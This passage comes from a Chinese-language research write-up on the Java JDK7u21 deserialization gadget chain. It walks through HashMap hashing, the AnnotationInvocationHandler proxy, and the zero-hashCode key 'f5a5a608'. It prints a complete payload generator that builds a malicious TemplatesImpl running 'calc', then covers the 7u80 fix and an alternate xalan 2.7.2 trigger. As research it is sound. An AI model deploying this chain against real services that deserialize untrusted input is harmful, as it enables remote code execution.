        }
我们专注于`if (e.hash == hash && ((k = e.key) == key || key.equals(k)))
{`这句语句。（e为前一个元素，key为当前元素）
可以看到`key.equals(k)`符合我们前面说到的`a.equals(b)`的格式。在只有两个元素的情况下，k为有序集合中第一个元素，key为第二个元素。
即我们需要一个有序集合`{templates，proxy}`才能满足`proxy.equals(templates)`这一句触发语句。
> 这也就是为什么需要有序集合的原因，如果是普通集合，不会一定会符合这个`a.equals(b)`的顺序
由于这里代码`(e.hash == hash && ((k = e.key) == key ||
key.equals(k)))`调用第三个语句就需要满足条件
  * `e.hash == hash`：templates的hash == proxy的hash
  * `(k = e.key) != key` ：templates（就是k） ！= proxy（就是key）（我们需要||左边这个表达式不满足，才会执行右边的漏洞触发函数key.equals(k)。这是||的特性，执行到一个为true的，后面的表达式就不执行了）
因为templates和proxy完全是两个不同的对象。所以第二个条件满足。
但是第一个条件需要hash相同，如果不是偷看答案的小白（我自己）肯定会突然僵住，特么这咋可能hash相等，当场直接gg。实际上套路还是很深。看hash是如何生成的
java.util.HashMap#hash
    final int hash(Object k) {
            int h = 0;
            if (useAltHashing) {
                if (k instanceof String) {
                    return sun.misc.Hashing.stringHash32((String) k);
                }
                h = hashSeed;
            }
            h ^= k.hashCode();//惊为天人的调用了我们传入的对象k的hashCode函数，也就是说我们有可能可以对于hash值进行一定的操控
            //接下来又是一些骚操作
            // This function ensures that hashCodes that differ only by
            // constant multiples at each bit position have a bounded
            // number of collisions (approximately 8 at default load factor).
            h ^= (h >>> 20) ^ (h >>> 12);
            return h ^ (h >>> 7) ^ (h >>> 4);
        }
我们传入的obj有TemplatesImpl类，但是这个类中没有自实现hashcode方法。
有Proxy对象（进入AnnotationInvocationHandler拦截器实现类），proxy.hashCode会先进入AnnotationInvocationHandler的invoke拦截器。（跟equals一样一样的，任何函数都会先进入invoke方法）
`sun.reflect.annotation.AnnotationInvocationHandler#invoke`
    public Object invoke(Object var1, Method var2, Object[] var3) {
            String var4 = var2.getName();
            Class[] var5 = var2.getParameterTypes();
            if (var4.equals("equals") && var5.length == 1 && var5[0] == Object.class) {
                return this.equalsImpl(var3[0]);//我们之前payload触发在这
            } else {
                assert var5.length == 0;
                if (var4.equals("toString")) {
                    return this.toStringImpl();
                } else if (var4.equals("hashCode")) {//往下看！这个可爱的invoke实现上对于hashCode这个函数还是有独特处理的！！！！
                    return this.hashCodeImpl();//进去看看
`sun.reflect.annotation.AnnotationInvocationHandler#hashCodeImpl`
    private int hashCodeImpl() {
            int var1 = 0;
            Entry var3;
            for(Iterator var2 = this.memberValues.entrySet().iterator(); var2.hasNext(); var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) {
                var3 = (Entry)var2.next();
            }
            return var1;
        }
这边写的贼复杂，改成简单点
    private int hashCodeImpl() {
            int var1 = 0;
            Entry var3;
            //this.memberValues是我们构造AnnotationInvocationHandler时，可控的那个map
            Iterator var2 = this.memberValues.entrySet().iterator();//获取遍历器
            for( ;var2.hasNext(); ) {
                var3 = (Entry)var2.next();
                String key = var3.getKey();//（可控map的键）
                Object value = var3.getValue()；//（可控map的值）
                var1 += 127 * 
                    key.hashCode() ^    //可控map的键 的 hashCode                
                    memberValueHashCode(value); //可控map的值的 hashCode
            }
            return var1;
        }
`sun.reflect.annotation.AnnotationInvocationHandler#memberValueHashCode`
    private static int memberValueHashCode(Object var0) {
            Class var1 = var0.getClass();
            if (!var1.isArray()) {//不是数组的话获取传入值的hashCode。
                return var0.hashCode(); //返回var0这个对象的hashCode
            ...
我们的目的是为了满足以下等式：
**Proxy的hashCode = 127 * 可控键的hashCode ^ 可控值的hashCode ==
TemplatesImpl的hashCode**
> *与 ^（异或） ，前者优先级高，后者优先级低，所以正常从左到右运算
>
> 又 0 ^ n = n
那么只需要可控键的hashCode等于0就会出现：
**127 * 0 ^ TemplatesImpl的hashCode == TemplatesImpl的hashCode**
this.memberValues中map中键值对的值为我们的恶意TemplatesImpl类即可，接下来需要它的键名的hashCode为0
研究员就是会寻找到一些神奇的值比如`"f5a5a608"`，`""` 这些值的hashCode为0！！！
所以我们在this.memberValues中赋值键值对 `("f5a5a608"->TemplatesImpl恶意类)`即可。
看payload
    public static void main(String[] args) throws Exception {
            //生成恶意的templates类
            Templates templates = Gadgets.createTemplatesImpl("calc");
            //AnnotationInvocationHandler类this.memberValues的map,填入键值对来满足hash相等
            Map map = new HashMap();
            String magicStr = "f5a5a608";
            //String magicStr_null = "";//也可
            //此处需要的先往map中放入一个没用的值，之后说明
            map.put(magicStr,"Override");
            //生成proxy对象
            final Constructor ctor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
            ctor.setAccessible(true);
            InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Templates.class,map);//this.type,this.memberValues
            Override proxy = (Override) Proxy.newProxyInstance(InvocationHandler.class.getClassLoader(),new Class[]{Override.class},invocationHandler);
            //生成LinkedHashSet，按照顺序一次放入templates和proxy
            HashSet set = new LinkedHashSet(); // 填入
            set.add(templates);
            set.add(proxy);
            //重新修改map的值
            map.put(magicStr,templates);
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            //序列化
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(set);//序列化对象
            objectOutputStream.flush();
            objectOutputStream.close();
            //反序列化
            byte[] bytes = byteArrayOutputStream.toByteArray(); //读取序列化后的对象byte数组
            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);//存放byte数组的输入流
            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
            Object o = objectInputStream.readObject();
        }
#### this.memberValues的键值对的值先占位
以上代码还会有最后一个疑问，为啥我们填入this.memberValues的map要先试用override字符串来占位，直接填入恶意的攻击类templates不行么？
确实是不行的，因为我们可以看到我们在生成LinkedHashSet时调用了`java.util.HashSet#add`
    public boolean add(E e) {
            return map.put(e, PRESENT)==null;
        }
这里调用了我们触发漏洞的函数map.put(),同时也是按照我们的漏洞触发顺序去调用map.put，这会导致payload会在我们本地触发，之后会无法序列化成功(至于为啥序列化不成功不想追究了！)
所以一套完美的利用链就分析完了！
## 修复情况
我们在7u80版本中去查看AnnotationInvocationHandler的构造方法，会发现对于this.type进行了校验必须为Annotation.class。
    AnnotationInvocationHandler(Class var1, Map var2) {
            Class[] var3 = var1.getInterfaces();
            if (var1.isAnnotation() && var3.length == 1 && var3[0] == Annotation.class) {
                this.type = var1;
                this.memberValues = var2;
            } else {
                throw new AnnotationFormatError("Attempt to create proxy for a non-annotation type.");
            }
        }
如果我们们使用以上的payload去打7u80版本的jdk就会在反序列化AnnotationInvocationHandler类调用其构造函数的时候，报错。
>
> 这也就是为什么之前的payload说到在高版本创建需要使用反射把恶意的this.type写进去，当然构造时可以这样，触发时就必须走构造函数，骚操作不了了。
主要组件的 LinkedHashSet -> AnnotationInvocationHandler -> templateImpl
就因为AnnotationInvocationHandler 反序列化失败而失败。
## 小结
一路分析下来，只能说这个利用链实在是太骚了。
从templates.newTransformer触发链的限制条件，使用javassist去构造templates恶意类。（其中分析了_tfactory与版本问题，payload位置static与构造函数的问题）
再通过java的动态代理特性，选中了AnnotationInvocationHandler这个拦截器。
我们通过AnnotationInvocationHandler的invoke拦截实现类的特性，选择了this.type特殊构造了AnnotationInvocationHandler类。链接了
proxy.equals(templates)到Templates.newTransformer()。
再是通过LinkedHashSet类，左打通了序列化与反序列化的入口点，右在反序列化恢复集合的过程中存在着一处a.equals(b)可以连接proxy.equals(templates)这一触发点。
最神奇的是为了满足到达触发点的要求，还反过头来利用AnnotationInvocationHandler类中的invoke方法中的hashCode路径。在AnnotationInvocationHandler构造中寻求了一处特殊的this.memberValues，来达成hash(a)=hash(b)的骚操作。
只可以说安全研究员真是大佬....这个穿针引线一处不差的。
虽然说这条利用链已经被封了好久了，但是我们也可以意识到被封杀的是AnnotationInvocationHandler构造方法处。
如果可以通过其他途径接上templates.newTransformer，就可以构筑一条新的链。因为单单templates.newTransformer是仍然可以作为payload执行的触发点的（比如7u80）。
## 2019.12.12更新
在看FastjsonExploit框架时，发现有Templates恶意类竟然有第二个触发点。前文中我们讲到的TemplatesImpl类是jdk自带的`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`包中的类
看了fastjsonexploit的代码后，发现在另外一个包里面有一个跟我们上面TemplatesImpl几乎完全一样的一个类。
我们在`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`的父类Templates中查找继承该父类的类。（idea下ctrl+alt+B）
可以发现在`org.apache.xalan.xsltc.trax.TemplatesImpl`也继承该接口。该类与之前的com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl几乎完全一致，payload也没有任何差别。，只是在构造exp触发那个自定义类时，继承父类`AbstractTranslet`接口的入参中不一样，但是如果我们是在代码中动态指定父类的话，这也无关痛痒。
在github的代码中查找继承Templates类是无法找到该类的。
因为这个类是位于xalan这个第三方包里面，而不是在jdk7本身的代码中。
            xalan
            xalan
            2.7.2
可见这个触发点的利用链利用条件就更加苛刻了。
不过单独就最后的这个触发点拎出来，也是一个新的思路，这样就把对于jdk7版本的限制变成了即使是jdk8的环境下，只要使用了xalan
2.7.2这个包，也会引入一个触发点。也算是扩大了攻击面吧。
# 参考
[javassist使用全解析](https://www.cnblogs.com/rickiyang/p/11336268.html)